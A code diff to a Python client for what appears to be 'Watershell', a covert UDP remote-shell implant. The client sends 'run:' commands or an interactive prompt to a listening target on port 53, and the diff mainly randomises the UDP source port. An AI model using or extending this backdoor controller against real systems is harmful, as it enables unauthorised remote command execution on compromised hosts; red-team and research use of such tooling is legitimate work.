@@ -12,6 +12,7 @@ import argparse
 import socket
 import time
 import sys
+import random
 
 def recv_timeout(the_socket, timeout=4):
     """
@@ -73,11 +74,13 @@ def declare_args():
         type=int,
         default=53,
         help="Port to send UDP message to.")
+
     parser.add_argument(
         '-c', '--command',
         dest='command',
         type=str,
         help="One off command to send to listening watershell target")
+
     parser.add_argument(
         '-i', '--interactive',
         dest='interactive',
@@ -107,9 +110,11 @@ def main():
     """
     args = declare_args().parse_args()
 
+
     # Bind source port to send UDP message from
+    src_port = random.randint(40000, 65353)
     s_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s_socket.bind(("0.0.0.0", 53316))
+    s_socket.bind(("0.0.0.0", src_port))
 
     target = (args.target, args.port)
     print("Connecting to Watershell on {}...".format(target))
@@ -122,7 +127,7 @@ def main():
         print("Connection Failed...")
         sys.exit(1)
 
-    if args.interactive:
+    if args.interactive and not args.command:
         execute_cmd_prompt(s_socket, target)
     else:
         s_socket.sendto(("run:{}".format(args.command)).encode(), target)
